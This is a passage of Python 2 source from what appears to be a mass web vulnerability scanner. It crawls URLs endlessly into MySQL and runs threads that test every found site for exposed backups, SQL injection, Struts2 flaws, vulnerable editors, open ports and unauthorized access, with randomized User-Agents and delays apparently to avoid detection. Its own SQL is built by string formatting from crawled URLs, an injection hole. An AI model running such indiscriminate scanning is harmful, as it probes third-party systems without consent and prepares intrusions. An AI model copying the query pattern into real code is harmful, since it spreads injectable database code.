                            print str(threading.current_thread().name) + ' ' + str(xieru2.url).strip('/') + '  ' + str(xieru2.status_code)
                            if xieru2.status_code == 200:
                                cooncaiji1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                                curcaiji1 = cooncaiji1.cursor()
                                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                sqlcaiji1 = "INSERT INTO url_check(url,cmsscan,rarscan,sqlscan,st2scan,editorscan,portscan,unauthorizedscan,datatime) select '%s','%s','%s','%s','%s','%s','%s','%s','%s' from dual where '%s' not in (select url from url_check)" % ((str(xxx), 0, 0,0,0, 0,0,0,str(timenow), str(xxx)))
                                sqlcaiji1_1 = "INSERT INTO url_index(url,urlget,datatime) select '%s','%s','%s' from dual where '%s' not in (select url from url_index)" % (str(xxx), '0', str(timenow), str(xxx))
                                curcaiji1.execute(sqlcaiji1)
                                cooncaiji1.commit()
                                curcaiji1.execute(sqlcaiji1_1)
                                cooncaiji1.commit()
                                curcaiji1.close()
                                cooncaiji1.close()
                                time.sleep(random.choice([0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1,1.1,1.2,1.3,1.5,2.3]))
                        else:
                            UA = random.choice(headerss)
                            headers = {'User-Agent': UA}
                            xieru2_0 = requests.head(url=str(xxx), headers=headers, timeout=5)
                            print str(threading.current_thread().name) + ' ' + str(xieru2_0.url).strip('/') + '  ' + str(xieru2_0.status_code)
                            if xieru2_0.status_code == 200:
                                cooncaiji1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, charset='utf8')
                                curcaiji1 = cooncaiji1.cursor()
                                timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                sqlcaiji1_0 = "INSERT INTO url_2check(url,cmsscan,rarscan,sqlscan,st2scan,editorscan,portscan,unauthorizedscan,datatime) select '%s','%s','%s','%s','%s','%s','%s','%s','%s' from dual where '%s' not in (select url from url_check)" % ((str(xxx), 0, 0, 0, 0, 0, 0, 0,str(timenow), str(xxx)))
                                sqlcaiji1_1_0 = "INSERT INTO url_2index(url,urlget,datatime) select '%s','%s','%s' from dual where '%s' not in (select url from url_index)" % (str(xxx), '0', str(timenow), str(xxx))
                                curcaiji1.execute(sqlcaiji1_0)
                                cooncaiji1.commit()
                                curcaiji1.execute(sqlcaiji1_1_0)
                                cooncaiji1.commit()
                                curcaiji1.close()
                                cooncaiji1.close()
                                time.sleep(random.choice([0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1, 1.1, 1.2, 1.3, 1.5, 2.3,2.6,3.1,3.5]))
                    except Exception, e:
                        pass

            except Exception, e:
                print unicode('爬行到的网址无法存储数据库，请检查配置文件及系统环境', 'utf-8')
                print e
        except Exception, e:
            pass
            #print e
    except Exception, e:
        pass
        #print e

def zairu():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        cooncaiji2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curcaiji2 = cooncaiji2.cursor()
        sqlcaiji2 = "select url from url_index where urlget=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sqlcaiji2_1 = "update url_index set urlget='1' where urlget = 0 limit 1"
        curcaiji2.execute(sqlcaiji2)
        cooncaiji2.commit()
        curscaiji = curcaiji2.fetchone()
        curcaiji2.execute(sqlcaiji2_1)
        cooncaiji2.commit()
        curcaiji2.close()
        cooncaiji2.close()
        lock.release()
        for xx in curscaiji:
            xxx1aiji = xx.replace("('","").replace("',)","")
            wuxiancaiji(xxx1aiji)
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print unicode('原始网址已经爬行完毕，请添加新的原始网址，使用方法详见帮助文档', 'utf-8')
        time.sleep(150)
        print e
def zairu2():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        cooncaiji2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curcaiji2 = cooncaiji2.cursor()
        sqlcaiji2 = "select url from url_2index where urlget=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sqlcaiji2_1 = "update url_2index set urlget='1' where urlget = 0 limit 1"
        curcaiji2.execute(sqlcaiji2)
        cooncaiji2.commit()
        curscaiji = curcaiji2.fetchone()
        curcaiji2.execute(sqlcaiji2_1)
        cooncaiji2.commit()
        curcaiji2.close()
        cooncaiji2.close()
        lock.release()
        for xx in curscaiji:
            xxx1aiji = xx.replace("('","").replace("',)","")
            wuxiancaiji(xxx1aiji)
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print unicode('原始网址已经爬行完毕，请添加新的原始网址，使用方法详见帮助文档', 'utf-8')
        time.sleep(150)
        print e
def rartiqu():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonrar2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        currar2 = coonrar2.cursor()
        sql = "select url from url_check where rarscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_check set rarscan='1' where rarscan = 0 limit 1"
        currar2.execute(sql)
        coonrar2.commit()
        cursrar = currar2.fetchone()
        currar2.execute(sql1)
        coonrar2.commit()
        currar2.close()
        coonrar2.close()
        lock.release()
        try:
            for xx in cursrar:
                xxx1rar = xx.replace("('","").replace("',)","")
                scan_backupfile(xxx1rar)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
        time.sleep(150)
        pass
def rartiqu2():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonrar2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        currar2 = coonrar2.cursor()
        sql = "select url from url_2check where rarscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_2check set rarscan='1' where rarscan = 0 limit 1"
        currar2.execute(sql)
        coonrar2.commit()
        cursrar = currar2.fetchone()
        currar2.execute(sql1)
        coonrar2.commit()
        currar2.close()
        coonrar2.close()
        lock.release()
        try:
            for xx in cursrar:
                xxx1rar = xx.replace("('","").replace("',)","")
                scan_backupfile(xxx1rar)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
        time.sleep(150)
        pass
def cmstiqu():
    try:
        time.sleep(random.randint(2, 10))
        lock.acquire()
        cooncms2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curcms2 = cooncms2.cursor()
        sql = "select url from url_check where cmsscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_check set cmsscan='1' where cmsscan = 0 limit 1"
        curcms2.execute(sql)
        cooncms2.commit()
        curscms = curcms2.fetchone()
        curcms2.execute(sql1)
        cooncms2.commit()
        curcms2.close()
        cooncms2.close()
        lock.release()
        try:
            for xx in curscms:
                xxx1cms = xx.replace("('","").replace("',)","")
                scan_cms(xxx1cms)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
        time.sleep(150)
        pass
def cmstiqu2():
    try:
        time.sleep(random.randint(2, 10))
        lock.acquire()
        cooncms2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curcms2 = cooncms2.cursor()
        sql = "select url from url_2check where cmsscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_2check set cmsscan='1' where cmsscan = 0 limit 1"
        curcms2.execute(sql)
        cooncms2.commit()
        curscms = curcms2.fetchone()
        curcms2.execute(sql1)
        cooncms2.commit()
        curcms2.close()
        cooncms2.close()
        lock.release()
        try:
            for xx in curscms:
                xxx1cms = xx.replace("('","").replace("',)","")
                scan_cms(xxx1cms)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
        time.sleep(150)
        pass
def porttiqu():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonport2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curport2 = coonport2.cursor()
        sql = "select url from url_check where portscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_check set portscan='1' where portscan = 0 limit 1"
        curport2.execute(sql)
        coonport2.commit()
        curs_port = curport2.fetchone()
        curport2.execute(sql1)
        coonport2.commit()
        curport2.close()
        coonport2.close()
        lock.release()
        try:
            for xx in curs_port:
                xxx1port = xx.replace("('","").replace("',)","").replace('http://','').replace('https://','')
                scan_port(xxx1port)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
        time.sleep(150)
def porttiqu2():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonport2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curport2 = coonport2.cursor()
        sql = "select url from url_2check where portscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_2check set portscan='1' where portscan = 0 limit 1"
        curport2.execute(sql)
        coonport2.commit()
        curs_port = curport2.fetchone()
        curport2.execute(sql1)
        coonport2.commit()
        curport2.close()
        coonport2.close()
        lock.release()
        try:
            for xx in curs_port:
                xxx1port = xx.replace("('","").replace("',)","").replace('http://','').replace('https://','')
                scan_port(xxx1port)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
        time.sleep(150)
def uath():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonuath2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curuath2 = coonuath2.cursor()
        sql = "select url from url_check where unauthorizedscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_check set unauthorizedscan='1' where unauthorizedscan = 0 limit 1"
        curuath2.execute(sql)
        coonuath2.commit()
        curs_uath = curuath2.fetchone()
        curuath2.execute(sql1)
        coonuath2.commit()
        curuath2.close()
        coonuath2.close()
        lock.release()
        try:
            for xx in curs_uath:
                xxx1uath = xx.replace("('","").replace("',)","").replace('http://','').replace('https://','')
                scan_unauthorizedscan(xxx1uath)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
        time.sleep(150)
def uath2():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonuath2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curuath2 = coonuath2.cursor()
        sql = "select url from url_2check where unauthorizedscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_2check set unauthorizedscan='1' where unauthorizedscan = 0 limit 1"
        curuath2.execute(sql)
        coonuath2.commit()
        curs_uath = curuath2.fetchone()
        curuath2.execute(sql1)
        coonuath2.commit()
        curuath2.close()
        coonuath2.close()
        lock.release()
        try:
            for xx in curs_uath:
                xxx1uath = xx.replace("('","").replace("',)","").replace('http://','').replace('https://','')
                scan_unauthorizedscan(xxx1uath)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
        time.sleep(150)
def sqltiqu():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonsql2_0 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        cursql2_0 = coonsql2_0.cursor()
        sql_0 = "select url from url_sqlinj_log where urlget=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1_0 = "update url_sqlinj_log set urlget='1' where urlget = 0 limit 1"
        cursql2_0.execute(sql_0)
        coonsql2_0.commit()
        cursql_0 = cursql2_0.fetchone()
        cursql2_0.execute(sql1_0)
        coonsql2_0.commit()
        cursql2_0.close()
        coonsql2_0.close()
        lock.release()
        try:
            for xx in cursql_0:
                xxx1sql0 = xx.replace("('","").replace("',)","")
                scan_sql(xxx1sql0)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
        time.sleep(60)

def sqlcrawl():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonsql2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        cursql2 = coonsql2.cursor()
        sql = "select url from url_check where sqlscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_check set sqlscan='1' where sqlscan = 0 limit 1"
        cursql2.execute(sql)
        coonsql2.commit()
        cursql = cursql2.fetchone()
        cursql2.execute(sql1)
        coonsql2.commit()
        cursql2.close()
        coonsql2.close()
        lock.release()
        try:
            for xx in cursql:
                xxx1sql = xx.replace("('","").replace("',)","")
                crawl_sql(xxx1sql)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
def sqlcrawl2():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonsql2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        cursql2 = coonsql2.cursor()
        sql = "select url from url_2check where sqlscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_2check set sqlscan='1' where sqlscan = 0 limit 1"
        cursql2.execute(sql)
        coonsql2.commit()
        cursql = cursql2.fetchone()
        cursql2.execute(sql1)
        coonsql2.commit()
        cursql2.close()
        coonsql2.close()
        lock.release()
        try:
            for xx in cursql:
                xxx1sql = xx.replace("('","").replace("',)","")
                crawl_sql(xxx1sql)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
def st2tiqu():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonst2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curst2 = coonst2.cursor()
        sql = "select url from url_check where st2scan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_check set st2scan='1' where st2scan = 0 limit 1"
        curst2.execute(sql)
        coonst2.commit()
        cur_st2 = curst2.fetchone()
        curst2.execute(sql1)
        coonst2.commit()
        curst2.close()
        coonst2.close()
        lock.release()
        try:
            for xx in cur_st2:
                xxx1st2 = xx.replace("('","").replace("',)","")
                scan_st2(xxx1st2)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
def st2tiqu2():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        coonst2 = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        curst2 = coonst2.cursor()
        sql = "select url from url_2check where st2scan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_2check set st2scan='1' where st2scan = 0 limit 1"
        curst2.execute(sql)
        coonst2.commit()
        cur_st2 = curst2.fetchone()
        curst2.execute(sql1)
        coonst2.commit()
        curst2.close()
        coonst2.close()
        lock.release()
        try:
            for xx in cur_st2:
                xxx1st2 = xx.replace("('","").replace("',)","")
                scan_st2(xxx1st2)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
def editortiqu():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        cooneditor = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        cureditor = cooneditor.cursor()
        sql = "select url from url_check where editorscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_check set editorscan='1' where editorscan = 0 limit 1"
        cureditor.execute(sql)
        cooneditor.commit()
        cur_editor = cureditor.fetchone()
        cureditor.execute(sql1)
        cooneditor.commit()
        cureditor.close()
        cooneditor.close()
        lock.release()
        try:
            for xx in cur_editor:
                xxx1ditor = xx.replace("('","").replace("',)","")
                scan_editor(xxx1ditor)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e
def editortiqu2():
    try:
        time.sleep(random.randint(2, 6))
        lock.acquire()
        cooneditor = pymysql.connect(user=user, passwd=passwd,host=host, db=Dbname)
        cureditor = cooneditor.cursor()
        sql = "select url from url_2check where editorscan=0 limit " + str(0) + ",1"  #10表示载入10个网址
        sql1 = "update url_2check set editorscan='1' where editorscan = 0 limit 1"
        cureditor.execute(sql)
        cooneditor.commit()
        cur_editor = cureditor.fetchone()
        cureditor.execute(sql1)
        cooneditor.commit()
        cureditor.close()
        cooneditor.close()
        lock.release()
        try:
            for xx in cur_editor:
                xxx1ditor = xx.replace("('","").replace("',)","")
                scan_editor(xxx1ditor)
        except Exception,e:
            pass
        time.sleep(random.randint(1, 3))
    except Exception,e:
        print e



def xc1():
    while 1:
        time.sleep(random.randint(2, 6))
        zairu()   #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1,5))
def xc1_0():
    while 1:
        time.sleep(random.randint(1,4))
        zairu2()
        time.sleep(random.randi(2,6))
def xc2():
    while 1:
        time.sleep(random.randint(1, 5))
        rartiqu()   #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc2_0():
    while 1:
        time.sleep(random.randint(1, 5))
        rartiqu2()   #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc3():
    while 1:
        time.sleep(random.randint(1, 5))
        cmstiqu()   #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc3_0():
    while 1:
        time.sleep(random.randint(1, 5))
        cmstiqu2()   #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc4():
    while 1: #
        time.sleep(random.randint(1, 5))
        sqltiqu()  #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc5():
    while 1: #
        time.sleep(random.randint(1, 5))
        st2tiqu() #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc5_0():
    while 1: #
        time.sleep(random.randint(1, 5))
        st2tiqu2() #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc6():
    while 1: #
        time.sleep(random.randint(1, 5))
        editortiqu()  #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc6_0():
    while 1: #
        time.sleep(random.randint(1, 5))
        editortiqu2()  #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc7():
    while 1: #
        time.sleep(random.randint(1, 5))
        sqlcrawl() #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc7_0():
    while 1: #
        time.sleep(random.randint(1, 5))
        sqlcrawl2() #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc8():
    while 1: #
        time.sleep(random.randint(1, 5))
        porttiqu() #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc8_0():
    while 1: #
        time.sleep(random.randint(1, 5))
        porttiqu2() #这里已经从数据库的到了到了10个网址
        time.sleep(random.randint(1, 5))
def xc9():
    while 1:
        time.sleep(random.randint(1,5))
        uath()
        time.sleep(random.randint(1,6))
def xc9_0():
    while 1:
        time.sleep(random.randint(1,5))
        uath2()
        time.sleep(random.randint(2,4))
# if int(thread_s) == 1:
#     threads=[]
#     t1 = threading.Thread(target=xc1)
#     t2 = threading.Thread(target=xc2)
#     t3 = threading.Thread(target=xc3)
#     t4 = threading.Thread(target=xc4)
#     t5 = threading.Thread(target=xc5)
#     t6 = threading.Thread(target=xc6)
#     t7 = threading.Thread(target=xc7)
#     t8 = threading.Thread(target=xc8)
#     if int(Urlcj) == 1:
#         print unicode('\n[+] 无限URL采集进程加载成功...', 'utf-8')
#         time.sleep(1)
#         threads.append(t1)
#     if int(Rarscan) == 1:
#         print unicode('\n[+] 备份文件扫描进程加载成功...', 'utf-8')
#         time.sleep(1)
#         threads.append(t2)
#     if int(Cmsscan) == 1:
#         print unicode('\n[+] CMS扫描认证进程加载成功...', 'utf-8')
#         time.sleep(1)
#         threads.append(t3)
#     if int(Sqlscan) == 1:
#         print unicode('\n[+] SQL注入扫描进程加载成功...', 'utf-8')
#         time.sleep(1)
#         threads.append(t4)
#         threads.append(t7)
#     if int(St2scan) == 1:
#         print unicode('\n[+] ST2框架扫描进程加载成功...', 'utf-8')
#         time.sleep(1)
#         threads.append(t5)
#     if int(Editorscan) == 1:
#         print unicode('\n[+] 编辑器扫描进程加载成功...', 'utf-8')
#         time.sleep(1)
#         threads.append(t6)
#     if int(Portscan) == 1:
#         print unicode('\n[+] 危险端口扫描进程加载成功...', 'utf-8')
#         time.sleep(1)
#         threads.append(t6)
#     else:
#         print unicode('\n[+]  未加载任何扫描任务 ','utf-8')
#         time.sleep(1000000)
#         pass
#     for x in threads:
#         x.start()
#     x.join()   #线程不堵塞  但是会出现不匀称的表现  并且会修改不同线程中的变量
#

lock = threading.Lock()
if int(scan2url) == 1:
    print unicode('\n[+] 子域名无限扫描采集进程加载成功...', 'utf-8')
    time.sleep(1)
if int(Rarscan) == 1:
    print unicode('\n[+] 备份文件扫描进程加载成功...', 'utf-8')
    time.sleep(1)
if int(Cmsscan) == 1:
    print unicode('\n[+] CMS扫描认证进程加载成功...', 'utf-8')
    time.sleep(1)
if int(Sqlscan) == 1:
    print unicode('\n[+] SQL注入扫描进程加载成功...', 'utf-8')
    time.sleep(1)
if int(St2scan) == 1:
    print unicode('\n[+] ST2框架扫描进程加载成功...', 'utf-8')
    time.sleep(1)
if int(Editorscan) == 1:
    print unicode('\n[+] 编辑器扫描进程加载成功...', 'utf-8')
    time.sleep(1)
if int(Portscan) == 1:
    print unicode('\n[+] 危险端口扫描进程加载成功...', 'utf-8')
    time.sleep(1)
if int(scanunauthorized) == 1:
    print unicode('\n[+] 未授权访问漏洞扫描进程加载成功...', 'utf-8')
    time.sleep(1)
if int(Urlcj) == 1:
    print unicode('\n[+] 无限URL采集进程加载成功...', 'utf-8')
    time.sleep(1)
if int(thread_s) > 2:
    
    for i in range(int(thread_s)):
        if int(scan2url) == 1:
            if int(Urlcj)==1:
                t1 = threading.Thread(target=xc1_0, args=(), name='URL Scan Thread -' + str(i)).start()
            if int(Rarscan) == 1:
                t2 = threading.Thread(target=xc2_0, args=(), name='RAR Scan Thread -' + str(i)).start()
            if int(Cmsscan) == 1:
                t3 = threading.Thread(target=xc3_0, args=(), name='CMS Scan Thread -' + str(i)).start()
            if int(Sqlscan) == 1:
                t4 = threading.Thread(target=xc4, args=(), name='SQL Scan Thread -' + str(i)).start()
                t7 = threading.Thread(target=xc7_0, args=(), name='SQL Scan Thread -' + str(i)).start()
            if int(St2scan) == 1:
                t5 = threading.Thread(target=xc5_0, args=(), name='ST2 Scan Thread -' + str(i)).start()
            if int(Editorscan) == 1:
                t6 = threading.Thread(target=xc6_0, args=(), name='EDI Scan Thread -' + str(i)).start()
            if int(Portscan) == 1:
                t8 = threading.Thread(target=xc8_0, args=(), name='IPS Scan Thread -' + str(i)).start()
            if int(scanunauthorized) == 1:
                t9 = threading.Thread(target=xc9_0, args=(), name='UAT Scan Thread -' + str(i)).start()
        if int(scan2url) == 0:
            if int(Urlcj) == 1:
                t1 = threading.Thread(target=xc1, args=(), name='URL Scan Thread -' + str(i)).start()
            if int(Rarscan) == 1:
                t2 = threading.Thread(target=xc2, args=(), name='RAR Scan Thread -' + str(i)).start()
            if int(Cmsscan) == 1:
                t3 = threading.Thread(target=xc3, args=(), name='CMS Scan Thread -' + str(i)).start()
            if int(Sqlscan) == 1:
                t4 = threading.Thread(target=xc4, args=(), name='SQL Scan Thread -' + str(i)).start()
                t7 = threading.Thread(target=xc7, args=(), name='SQL Scan Thread -' + str(i)).start()
            if int(St2scan) == 1:
                t5 = threading.Thread(target=xc5, args=(), name='ST2 Scan Thread -' + str(i)).start()
            if int(Editorscan) == 1:
                t6 = threading.Thread(target=xc6, args=(), name='EDI Scan Thread -' + str(i)).start()
            if int(Portscan) == 1:
                t8 = threading.Thread(target=xc8, args=(), name='IPS Scan Thread -' + str(i)).start()
            if int(scanunauthorized) == 1:
                t9 = threading.Thread(target=xc9, args=(), name='UAT Scan Thread -' + str(i)).start()










# if int(thread_s) > 1:
#     if int(Urlcj) == 1:
#         print unicode('\n[+] 无限URL采集进程加载成功...', 'utf-8')
#         time.sleep(1)
#     if int(Rarscan) == 1:
#         print unicode('\n[+] 备份文件扫描进程加载成功...', 'utf-8')
#         time.sleep(1)
#     if int(Cmsscan) == 1:
#         print unicode('\n[+] CMS扫描认证进程加载成功...', 'utf-8')
#         time.sleep(1)
#     if int(Sqlscan) == 1:
#         print unicode('\n[+] SQL注入扫描进程加载成功...', 'utf-8')
#         time.sleep(1)
#     if int(St2scan) == 1:
#         print unicode('\n[+] ST2框架扫描进程加载成功...', 'utf-8')
#         time.sleep(1)
#     if int(Editorscan) == 1:
#         print unicode('\n[+] 编辑器扫描进程加载成功...', 'utf-8')
#         time.sleep(1)
#     if int(Portscan) == 1:
#         print unicode('\n[+] 危险端口扫描进程加载成功...', 'utf-8')
#         time.sleep(1)

